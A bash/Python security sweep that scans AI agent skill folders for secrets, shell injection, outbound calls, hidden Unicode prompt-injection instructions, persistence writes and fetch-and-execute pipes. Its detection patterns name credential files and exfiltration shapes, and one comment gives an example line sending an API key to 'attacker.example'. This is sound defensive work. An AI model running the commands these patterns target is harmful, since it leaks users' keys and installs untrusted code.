#!/usr/bin/env bash
# Bundled security sweep — runs regex-based checks against a skill folder.
# This is the PRIMARY security check; it ships inside the skill and works in
# any repo. It is intentionally NOT a CVE / dependency scanner — skills are
# mostly markdown + shell scripts with minimal dependencies, so the high-value
# patterns to catch are:
#   - Hardcoded secrets / tokens / API keys
#   - eval / exec on dynamic input (shell injection vector)
#   - rm -rf with user-supplied or relative paths
#   - Network calls (curl/wget) to hardcoded URLs that could be exfiltration
#   - $(...) / ${...:?} / `...` with user input
#   - Path traversal patterns
#   - Unscoped Bash allowlist entries in frontmatter
#
# For full CVE / dependency scanning, the user should run their own tooling
# (snyk, dependabot, etc.) separately. This sweep targets skill-specific risks.
#
# Usage:
#   security_sweep.sh <skill-path>
#
# Output: human-readable findings, one per line, prefixed by severity.
# Exit codes:
#   0 = no findings, 1 = findings present (still success — caller decides),
#   2 = usage error

set -euo pipefail

if [[ $# -ne 1 ]]; then
  echo "Usage: $0 <skill-path>" >&2
  exit 2
fi

SKILL_PATH="$1"

if [[ ! -d "$SKILL_PATH" ]]; then
  echo "ERROR: not a directory: $SKILL_PATH" >&2
  exit 2
fi

FINDINGS=0

# Helper: emit a finding line
emit() {
  local sev="$1"
  local rule="$2"
  local file="$3"
  local line="$4"
  local evidence="$5"
  echo "[$sev] $rule | $file:$line | $evidence"
  FINDINGS=$((FINDINGS + 1))
}

# Helper: is this content line a comment in shell/python? (skip false positives in docs)
is_comment() {
  local content="$1"
  # Trim leading whitespace, then check if starts with #
  if echo "$content" | sed 's/^[[:space:]]*//' | grep -qE '^#'; then
    return 0
  fi
  return 1
}

# Helper: is this content line a documentation echo / printf? (telling the user
# how to install something is NOT the same as installing it).
is_doc_echo() {
  local content="$1"
  if echo "$content" | sed 's/^[[:space:]]*//' | grep -qE '^(echo|printf|cat[[:space:]]+<|#)'; then
    return 0
  fi
  return 1
}

# === Pattern set ===
# Each block runs a grep and emits a finding per hit.

# 1. Hardcoded secrets (broad catch — false positives expected, human reviews)
#    Patterns: AWS keys, GitHub tokens, generic API tokens, JWTs, private keys
SECRET_PATTERNS=(
  'AKIA[0-9A-Z]{16}'                                     # AWS access key
  'aws_secret_access_key[[:space:]]*=[[:space:]]*[A-Za-z0-9/+]{40}'
  'ghp_[A-Za-z0-9]{36}'                                  # GitHub personal token
  'github_pat_[A-Za-z0-9_]{82}'                          # GitHub fine-grained token
  'gho_[A-Za-z0-9]{36}'                                  # GitHub OAuth
  'xox[abprs]-[A-Za-z0-9-]+'                             # Slack tokens
  'sk-[A-Za-z0-9]{32,}'                                  # Generic API key (OpenAI/Anthropic style)
  'sk-ant-[A-Za-z0-9_-]{32,}'                            # Anthropic API key
  '-----BEGIN [A-Z ]+PRIVATE KEY-----'                   # PEM private key
  'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'    # JWT
)

while IFS= read -r -d '' file; do
  for pattern in "${SECRET_PATTERNS[@]}"; do
    while IFS=: read -r ln content; do
      [[ -z "$ln" ]] && continue
      emit "BLOCKER" "hardcoded_secret" "$file" "$ln" "$(echo "$content" | head -c 80)..."
    done < <(grep -nE "$pattern" "$file" 2>/dev/null || true)
  done
# Note: *.md is intentionally excluded here. Markdown files legitimately
# reference token shapes (e.g., "$ANTHROPIC_API_KEY", `sk-...`) in docs and
# code-fences. The Python pass later applies code-span / comment calibration
# for .md context; the bash patterns above can't do that and would noise the
# review. If you're hunting a secret leaked into docs, look at git history.
done < <(find "$SKILL_PATH" -type f \( -name "*.sh" -o -name "*.py" -o -name "*.ts" -o -name "*.js" -o -name "*.json" -o -name "*.yaml" -o -name "*.yml" \) -print0 2>/dev/null)

# 2. eval/exec on dynamic content (shell injection)
while IFS= read -r -d '' file; do
  while IFS=: read -r ln content; do
    [[ -z "$ln" ]] && continue
    is_comment "$content" && continue
    emit "MUST-FIX" "eval_or_exec_on_dynamic_input" "$file" "$ln" "$(echo "$content" | sed 's/^[[:space:]]*//' | head -c 100)"
  done < <(grep -nE '(^|[^a-zA-Z_])(eval|exec)[[:space:]]*[("$`]' "$file" 2>/dev/null || true)
done < <(find "$SKILL_PATH" -type f \( -name "*.sh" -o -name "*.py" \) -print0 2>/dev/null)

# 3. rm -rf with variable or relative path (catastrophic delete risk)
while IFS= read -r -d '' file; do
  while IFS=: read -r ln content; do
    [[ -z "$ln" ]] && continue
    is_comment "$content" && continue
    # Skip if the path is clearly an absolute /tmp/ or /var/tmp/
    if echo "$content" | grep -qE 'rm[[:space:]]+-[rR]f[[:space:]]+/(tmp|var/tmp)/'; then
      continue
    fi
    emit "MUST-FIX" "dangerous_rm_rf" "$file" "$ln" "$(echo "$content" | sed 's/^[[:space:]]*//' | head -c 100)"
  done < <(grep -nE 'rm[[:space:]]+-[rR]f?[[:space:]]+(\$|\.\.?/|[^/])' "$file" 2>/dev/null || true)
done < <(find "$SKILL_PATH" -type f -name "*.sh" -print0 2>/dev/null)

# 4. curl/wget to non-localhost (potential exfiltration channel)
while IFS= read -r -d '' file; do
  while IFS=: read -r ln content; do
    [[ -z "$ln" ]] && continue
    is_comment "$content" && continue
    # Skip localhost / 127.0.0.1 / known-good
    if echo "$content" | grep -qE 'https?://(localhost|127\.0\.0\.1|0\.0\.0\.0)'; then
      continue
    fi
    emit "SUGGEST" "outbound_network_call" "$file" "$ln" "$(echo "$content" | sed 's/^[[:space:]]*//' | head -c 120)"
  done < <(grep -nE '(curl|wget)[[:space:]]+[^|;&]*https?://' "$file" 2>/dev/null || true)
done < <(find "$SKILL_PATH" -type f \( -name "*.sh" -o -name "*.py" \) -print0 2>/dev/null)

# 5. Path traversal patterns inside scripts (../../)
while IFS= read -r -d '' file; do
  while IFS=: read -r ln content; do
    [[ -z "$ln" ]] && continue
    is_comment "$content" && continue
    emit "SUGGEST" "path_traversal" "$file" "$ln" "$(echo "$content" | sed 's/^[[:space:]]*//' | head -c 100)"
  done < <(grep -nE '\.\./\.\./\.\.' "$file" 2>/dev/null || true)
done < <(find "$SKILL_PATH" -type f \( -name "*.sh" -o -name "*.py" \) -print0 2>/dev/null)

# 6. Unscoped Bash allowlist entries in frontmatter (cross-check with J22-J23)
SKILL_MD="$SKILL_PATH/SKILL.md"
if [[ -f "$SKILL_MD" ]]; then
  # Extract frontmatter and look for allowed-tools with broad Bash patterns
  if grep -qE 'Bash\(\*\)' "$SKILL_MD" 2>/dev/null; then
    LN="$(grep -nE 'Bash\(\*\)' "$SKILL_MD" | head -1 | cut -d: -f1)"
    emit "BLOCKER" "unscoped_bash_allowlist" "$SKILL_MD" "$LN" "Bash(*) grants execution of any shell command — defeats prompt-injection defense"
  fi
fi

# 6b. MCP tool referenced by UUID in allowed-tools (R6 — non-portable across machines).
#     The form `mcp__<UUID>__<tool>` is bound to ONE user's local MCP install ID
#     and won't activate on any other dev's machine. The named form
#     `mcp__<servername>__<tool>` is portable. Catches the pattern in any line
#     of the SKILL.md (frontmatter or body — both are wrong).
if [[ -f "$SKILL_MD" ]]; then
  while IFS=: read -r ln content; do
    [[ -z "$ln" ]] && continue
    emit "MUST-FIX" "mcp_uuid_hardcoded" "$SKILL_MD" "$ln" "$(echo "$content" | sed 's/^[[:space:]]*//' | head -c 100)"
  done < <(grep -nE 'mcp__[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}__' "$SKILL_MD" 2>/dev/null || true)
fi

# 7. Pre-flight: detect blockchain context for crypto-rule severity calibration.
#    Skills that self-declare blockchain/crypto/defi/web3 domain in their
#    description LEGITIMATELY reference wallet env vars, exchange APIs, and
#    keystore paths — they're the whole point. Demote crypto_cred_reference
#    from BLOCKER to SUGGEST in that context. Private key LITERALS still stay
#    BLOCKER (no skill should embed those inline — use env vars).
IS_BLOCKCHAIN="false"
BLOCKCHAIN_KW='\b(blockchain|crypto(currency)?|defi|wallet|smart[ -]?contract|web3|ethereum|solana|bitcoin|evm|polygon|arbitrum|nft|dapp|tokenomics)\b'
if [[ -f "$SKILL_PATH/SKILL.md" ]]; then
  if grep -iqE "$BLOCKCHAIN_KW" "$SKILL_PATH/SKILL.md" 2>/dev/null; then
    IS_BLOCKCHAIN="true"
  fi
fi

# 8. Prompt-injection / obfuscation / crypto / persistence checks (Python pass).
#    Handles Unicode-aware detection that bash regex cannot do portably.
#
# References (mai/26 state-of-the-art):
#   - Embrace The Red (wunderwuzzi23), "Scary Agent Skills: Hidden Unicode Instructions" (Feb 2026)
#   - Snyk ToxicSkills study, Feb 2026 (mcp-scan engine)
#   - Skills Directory (skillsdirectory.com) — 50+ static rules with code-fence calibration
#   - Repello SkillCheck — four attack patterns documented
#
# Checks performed in one pass per file:
#   A. unicode_tag_smuggling     — invisible instructions in U+E0000..U+E007F (BLOCKER if a run >=10 chars)
#   B. unicode_tag_present       — sparse Unicode Tag chars >=5 total (MUST-FIX, manual review)
#   C. excessive_zero_width      — ZWSP/ZWNJ/variation selectors >=50 chars (MUST-FIX)
#   D. long_base64_blob          — 60+ char base64 token with mixed-case+digit (MUST-FIX)
#   E. env_var_exfil_same_line   — credential ref AND network call on the same line (BLOCKER)
#   F. env_var_exfil_proximity   — credential ref within +/-3 lines of network call (BLOCKER)
#
# Calibration choices:
#   - Base64 heuristic requires upper+lower+digit (filters out hex hashes and SHAs).
#   - Base64 finding suppressed when context shows data URI / integrity= / sha-prefix.
#   - Unicode Tag threshold of 10 chars is the Embrace The Red recommendation;
#     CKL skills do not legitimately use this codepoint block.
#   - Cred regex is conservative (canonical names only) — ANTHROPIC, OPENAI, AWS_*,
#     GITHUB_TOKEN, GH_TOKEN, ~/.aws/credentials, ~/.ssh/id_*. Add more here as
#     real CKL exfil patterns surface.

SWEEP_PYTHON_CHECKS='
import sys, re

try:
    content = open(sys.argv[1], "rb").read().decode("utf-8", errors="replace")
except Exception:
    sys.exit(0)

lines = content.split("\n")

# A + B. Unicode Tag codepoints (U+E0000..U+E007F) — invisible instructions
tag_runs = re.findall(r"[\U000E0000-\U000E007F]+", content)
longest_tag = max((len(r) for r in tag_runs), default=0)
total_tag = sum(len(r) for r in tag_runs)
if longest_tag >= 10:
    ln_no = 1
    for i, ln in enumerate(lines, 1):
        if re.search(r"[\U000E0000-\U000E007F]{3,}", ln):
            ln_no = i
            break
    print(f"BLOCKER|unicode_tag_smuggling|{ln_no}|Unicode Tag run of {longest_tag} consecutive chars (U+E0000..U+E007F) — invisible instructions hidden in text")
elif total_tag >= 5:
    print(f"MUST-FIX|unicode_tag_present|1|{total_tag} total Unicode Tag chars present (sparse) — review for hidden instructions")

# C. Excessive zero-width chars (ZWSP, ZWNJ, ZWJ, word joiner, BOM, variation selectors).
#    Codepoints: 200B-200D (ZW space/non-joiner/joiner), 2060 (word joiner),
#    FEFF (BOM / ZW no-break space), FE00-FE0F (variation selectors).
#    Pattern uses \\u escapes — typing literal ZW chars in source would be
#    invisible in editors AND would self-flag this very file.
zw_pattern = "[" + chr(0x200B) + "-" + chr(0x200D) + chr(0x2060) + chr(0xFEFF) + chr(0xFE00) + "-" + chr(0xFE0F) + "]"
zw_count = len(re.findall(zw_pattern, content))
if zw_count >= 50:
    print(f"MUST-FIX|excessive_zero_width|1|{zw_count} zero-width chars detected — well above the emoji noise floor")

# D. Long base64 blobs (mix of upper/lower/digit filters out hex hashes)
seen_blob = False
for blob in re.findall(r"[A-Za-z0-9+/]{60,}={0,2}", content):
    if seen_blob:
        break
    if not (any(c.isupper() for c in blob) and any(c.islower() for c in blob) and any(c.isdigit() for c in blob)):
        continue
    blob_line, context = 1, ""
    for i, ln in enumerate(lines, 1):
        if blob in ln:
            blob_line, context = i, ln
            break
    if re.search(r"(data:[a-z]+/[a-z+.\-]+;base64,|sha\d+[-:]|integrity=)", context):
        continue
    print(f"MUST-FIX|long_base64_blob|{blob_line}|Long base64 blob ({len(blob)} chars) — common obfuscation pattern, verify intent")
    seen_blob = True

# E + F. Environment variable exfiltration: credential reference near network call.
#
# Calibration: the cred/net regex would otherwise self-flag on documentation that
# discusses these rules (gotchas.md, SKILL.md Step 2, etc.). Two suppressions:
#   - Skip the match if it is inside a markdown inline code span (between backticks).
#   - Skip the match if its line is a shell-style comment (starts with #).
# Both heuristics catch "this is documentation, not actual code" without losing
# the malicious case (real exfil uses naked patterns, no backticks, no comment).
cred_re = re.compile(r"(\$ANTHROPIC_API_KEY|\$AWS_[A-Z_]+|\$OPENAI_API_KEY|\$GITHUB_TOKEN|\$GH_TOKEN|~/\.aws/credentials|~/\.ssh/id_[a-z]+)")
net_re = re.compile(r"\b(curl|wget|fetch|axios|urlopen|requests\.[a-z]+|http\.[a-z]+)\b")

def _is_shell_comment(s):
    return bool(re.match(r"^\s*#", s))

def _in_code_span(line, pos):
    # Markdown inline code span: position is inside if odd number of backticks precede it.
    return line[:pos].count("`") % 2 == 1

def _meaningful_match(line, mobj):
    if _is_shell_comment(line):
        return False
    if _in_code_span(line, mobj.start()):
        return False
    return True

cred_lines_idx = []
for i, ln in enumerate(lines, 1):
    m = cred_re.search(ln)
    if m and _meaningful_match(ln, m):
        cred_lines_idx.append(i)

net_lines_idx = set()
for i, ln in enumerate(lines, 1):
    m = net_re.search(ln)
    if m and _meaningful_match(ln, m):
        net_lines_idx.add(i)
WINDOW = 3
emitted_pairs = set()
for cl in cred_lines_idx:
    for delta in range(-WINDOW, WINDOW + 1):
        i = cl + delta
        if i in net_lines_idx:
            key = (cl, i)
            if key in emitted_pairs:
                continue
            emitted_pairs.add(key)
            if i == cl:
                print(f"BLOCKER|env_var_exfil_same_line|{cl}|Credential reference AND network call on the same line — direct exfiltration shape")
            else:
                print(f"BLOCKER|env_var_exfil_proximity|{cl}|Credential reference within {WINDOW} lines of network call (line {i}) — possible exfiltration")
            break

# G. Crypto credential references (env vars / wallet paths / exchange API names).
#    SEVERITY IS CONDITIONAL on whether the skill self-declares as blockchain
#    domain (see IS_BLOCKCHAIN preflight). For a normal skill: BLOCKER, because
#    the only reason to reference a mnemonic env var is exfiltration. For a
#    blockchain skill: SUGGEST, because referencing wallet env vars IS the
#    skill is purpose — reviewer must still confirm the value is handled safely
#    (read into a variable used by an SDK, never embedded in URLs or logs).
IS_BLOCKCHAIN = (len(sys.argv) > 2 and sys.argv[2] == "true")
crypto_re = re.compile(
    r"(\$MNEMONIC|\$SEED_PHRASE|\$WALLET_MNEMONIC|\$MNEMONIC_PHRASE"
    r"|\$PRIVATE_KEY|\$ETH_PRIVATE_KEY|\$SOL_PRIVATE_KEY|\$BTC_PRIVATE_KEY"
    r"|\$BINANCE_API_KEY|\$COINBASE_API_KEY|\$KRAKEN_API_KEY|\$FTX_API_KEY"
    r"|wallet\.dat|keystore\.json"
    r"|~/\.ethereum/keystore|~/\.solana/keypair|~/\.bitcoin/wallet)"
)
for i, ln in enumerate(lines, 1):
    m = crypto_re.search(ln)
    if m and _meaningful_match(ln, m):
        sample = m.group(0)
        if len(sample) > 40:
            sample = sample[:37] + "..."
        if IS_BLOCKCHAIN:
            print(f"SUGGEST|crypto_cred_reference|{i}|Crypto wallet/mnemonic/exchange-API reference (demoted from BLOCKER — skill self-declares blockchain domain; reviewer must confirm safe handling): {sample}")
        else:
            print(f"BLOCKER|crypto_cred_reference|{i}|Crypto wallet/mnemonic/exchange-API reference: {sample}")

# H. Private key literals — ALWAYS BLOCKER regardless of blockchain context.
#    No legitimate skill, blockchain or otherwise, should embed a private key
#    inline. The correct pattern is to reference an env var that holds the key
#    at runtime. Embedding the literal value = the key is in version control =
#    the key is compromised the moment the skill is pushed.
eth_key_re = re.compile(r"0x[a-fA-F0-9]{64}\b")
btc_key_re = re.compile(r"\b[5KL][a-km-zA-HJ-NP-Z1-9]{50,51}\b")
for i, ln in enumerate(lines, 1):
    for pat, label, desc in (
        (eth_key_re, "eth_private_key_literal", "Ethereum private key literal (0x + 64 hex)"),
        (btc_key_re, "btc_private_key_literal", "Bitcoin WIF private key literal"),
    ):
        m = pat.search(ln)
        if m and _meaningful_match(ln, m):
            sample = m.group(0)
            if len(sample) > 40:
                sample = sample[:37] + "..."
            print(f"BLOCKER|{label}|{i}|{desc} — should be referenced via env var, not embedded: {sample}")
            break  # one finding per line is enough

# I. Persistence install patterns — would survive a session and re-trigger later.
#    Critical in CKL context because a dev machine aggregates N client envs;
#    persistence on the laptop = compromise across every client they touch.
persist_cmd_re = re.compile(
    r"\bcrontab\s+-[elr]\b"
    r"|\bsystemctl\s+(enable|start)\b"
    r"|\blaunchctl\s+(load|bootstrap)\b"
)
persist_write_re = re.compile(
    r">>?\s*~/\.(bashrc|zshrc|profile|bash_profile|bash_login|zprofile|zshenv)\b"
    r"|>>?\s*~/\.ssh/(authorized_keys|config)\b"
    r"|>>?\s*/etc/(cron\.[a-z]+/|systemd/system/|profile|profile\.d/)"
    r"|>>?\s*~/Library/(LaunchAgents|LaunchDaemons)/"
)
for i, ln in enumerate(lines, 1):
    for pat, label, desc in (
        (persist_cmd_re, "persistence_command", "Persistence install command (cron/systemd/launchd)"),
        (persist_write_re, "persistence_write", "Write redirect to persistence-relevant file (rc, authorized_keys, cron dir, launch agent)"),
    ):
        m = pat.search(ln)
        if m and _meaningful_match(ln, m):
            sample = m.group(0).strip()
            if len(sample) > 40:
                sample = sample[:37] + "..."
            print(f"MUST-FIX|{label}|{i}|{desc}: {sample}")
            break  # one finding per line

# J. Homoglyph / mixed-script identifier (R1 — confusable attack).
#    Latin + Cyrillic/Greek in the same alphanumeric run is almost always a
#    visual spoof (Cyrillic а U+0430 disguised as Latin a U+0061). Legitimate
#    skills do not mix scripts inside identifiers. Severity is BLOCKER when
#    detected inside the YAML frontmatter (name/description impersonation
#    risk) and MUST-FIX elsewhere in the body.
def _has_mixed_script(word):
    has_latin = any(("A" <= c <= "Z") or ("a" <= c <= "z") for c in word)
    has_cyrillic = any("Ѐ" <= c <= "ӿ" for c in word)
    has_greek = any("Ͱ" <= c <= "Ͽ" for c in word)
    return has_latin and (has_cyrillic or has_greek)

# Find the frontmatter boundary (--- ... ---) so we can promote severity inside it.
frontmatter_end = 0
fm_starts = [i for i, ln in enumerate(lines, 1) if ln.strip() == "---"]
if len(fm_starts) >= 2 and fm_starts[0] == 1:
    frontmatter_end = fm_starts[1]

# Build regex via \u escapes so the surrounding bash file stays ASCII-only.
word_re = re.compile("[A-Za-zͰ-ϿЀ-ӿ]{3,}")
for i, ln in enumerate(lines, 1):
    for word in word_re.findall(ln):
        if _has_mixed_script(word):
            sev = "BLOCKER" if i <= frontmatter_end else "MUST-FIX"
            print(f"{sev}|homoglyph_mixed_script|{i}|Mixed-script identifier (Latin + Cyrillic/Greek) — confusable: {word}")
            break  # one finding per line is enough

# K. Env var embedded in URL query string (R2 — direct exfil shape).
#    curl https://attacker.example/?token=$ANTHROPIC_API_KEY etc.
#    Tighter than the proximity heuristic — fires on a single literal line.
url_var_re = re.compile(r"https?://[^\s\"`]*[?&][a-zA-Z_][a-zA-Z0-9_]*=\$[A-Z_][A-Z0-9_]+")
for i, ln in enumerate(lines, 1):
    m = url_var_re.search(ln)
    if m and _meaningful_match(ln, m):
        sample = m.group(0)
        if len(sample) > 100:
            sample = sample[:97] + "..."
        print(f"BLOCKER|var_in_url_query|{i}|Env var embedded in URL query string — exfil shape: {sample}")

# L. Fetch-and-execute (R3) — curl ... | sh, wget ... | bash, etc.
#    Moved into Python so _meaningful_match skips backtick-quoted prose in docs
#    (rules.md / ckl-recurring-issues.md describe this attack pattern and would
#    otherwise self-flag every render).
fetch_exec_re = re.compile(r"\b(curl|wget)\s+[^|;&\n]+\|\s*(sh|bash|zsh|fish|python3?|node|ruby)\b")
for i, ln in enumerate(lines, 1):
    m = fetch_exec_re.search(ln)
    if m and _meaningful_match(ln, m):
        sample = m.group(0)
        if len(sample) > 120:
            sample = sample[:117] + "..."
        print(f"BLOCKER|fetch_and_execute|{i}|Fetch-and-execute pattern (curl|sh, wget|bash, etc.) — supply-chain shape: {sample}")

# M. Stale Claude model IDs (R7).
#    Moved into Python for the same backtick guard — docs cite these model
#    names when describing migrations.
stale_model_re = re.compile(r"\bclaude-(2(\.[0-9]+)?|3(-[a-z]+)?(-[0-9]+)?|instant)\b")
for i, ln in enumerate(lines, 1):
    m = stale_model_re.search(ln)
    if m and _meaningful_match(ln, m):
        sample = m.group(0)
        print(f"SUGGEST|stale_model_id|{i}|Retired Claude model family reference: {sample}")
'

while IFS= read -r -d '' file; do
  # Skip the sweep script itself: it contains the patterns it scans for
  # (cred names, network call words, base64 mentions) by design — scanning it
  # would always produce tautological findings. Same rationale as the
  # is_comment() helper for doc comments, scaled up to a multi-line Python
  # heredoc.
  if [[ "$(basename "$file")" == "security_sweep.sh" ]]; then
    continue
  fi
  while IFS='|' read -r sev rule ln evidence; do
    [[ -z "$sev" ]] && continue
    emit "$sev" "$rule" "$file" "$ln" "$evidence"
  done < <(python3 -c "$SWEEP_PYTHON_CHECKS" "$file" "$IS_BLOCKCHAIN" 2>/dev/null || true)
done < <(find "$SKILL_PATH" -type f \( -name "*.md" -o -name "*.sh" -o -name "*.py" -o -name "*.json" -o -name "*.yaml" -o -name "*.yml" \) -print0 2>/dev/null)

# 9. Fetch-and-execute (R3) — moved into the Python pass (check L) so that
#    docs in .md files describing the attack pattern get backtick-calibrated.
#    See SWEEP_PYTHON_CHECKS below.

# 10. Silent dependency installs in scripts (R4).
#     A skill whose script runs `npm i` / `pip install` / `brew install` /
#     `cargo install` without explicit user prompt is taking a supply-chain
#     risk on behalf of the user without consent. Setup scripts that the user
#     deliberately invokes are different — those usually have a `setup-` or
#     `bootstrap-` prefix; reviewer can judge.
while IFS= read -r -d '' file; do
  if [[ "$(basename "$file")" == "security_sweep.sh" ]]; then continue; fi
  while IFS=: read -r ln content; do
    [[ -z "$ln" ]] && continue
    is_comment "$content" && continue
    is_doc_echo "$content" && continue
    emit "MUST-FIX" "silent_dependency_install" "$file" "$ln" "$(echo "$content" | sed 's/^[[:space:]]*//' | head -c 100)"
  done < <(grep -nE '(^|[[:space:];&|])(npm[[:space:]]+(i|install|ci)|pnpm[[:space:]]+(add|install|i)|yarn[[:space:]]+(add|install)|pip3?[[:space:]]+install|brew[[:space:]]+install|cargo[[:space:]]+install|gem[[:space:]]+install|apt-get[[:space:]]+install|apk[[:space:]]+add)' "$file" 2>/dev/null || true)
done < <(find "$SKILL_PATH" -type f -name "*.sh" -print0 2>/dev/null)

# 11. Hardcoded user paths (R5) — portability + credential exposure.
#     /Users/<name>/, /home/<name>/. Severity is BLOCKER when the path is also
#     credential-shaped (~/.ssh, ~/.aws, ~/.config/gh), MUST-FIX otherwise.
while IFS= read -r -d '' file; do
  if [[ "$(basename "$file")" == "security_sweep.sh" ]]; then continue; fi
  while IFS=: read -r ln content; do
    [[ -z "$ln" ]] && continue
    is_comment "$content" && continue
    if echo "$content" | grep -qE '/(Users|home)/[a-zA-Z0-9._-]+/(\.ssh|\.aws|\.config/gh|\.config/anthropic|\.gnupg)'; then
      emit "BLOCKER" "hardcoded_credential_path" "$file" "$ln" "$(echo "$content" | sed 's/^[[:space:]]*//' | head -c 120)"
    else
      emit "MUST-FIX" "hardcoded_user_path" "$file" "$ln" "$(echo "$content" | sed 's/^[[:space:]]*//' | head -c 120)"
    fi
  done < <(grep -nE '/(Users|home)/[a-zA-Z][a-zA-Z0-9._-]*/' "$file" 2>/dev/null || true)
done < <(find "$SKILL_PATH" -type f \( -name "*.sh" -o -name "*.py" \) -print0 2>/dev/null)

# 12. Stale Claude model IDs (R7) — moved into the Python pass (check M) so
#     migration docs that legitimately cite retired model families inside
#     backticks don't self-flag. See SWEEP_PYTHON_CHECKS above.

# Summary line on stderr for easy parsing
echo "" >&2
echo "Security sweep complete: $FINDINGS finding(s)" >&2

if [[ "$FINDINGS" -gt 0 ]]; then
  exit 1
fi
exit 0
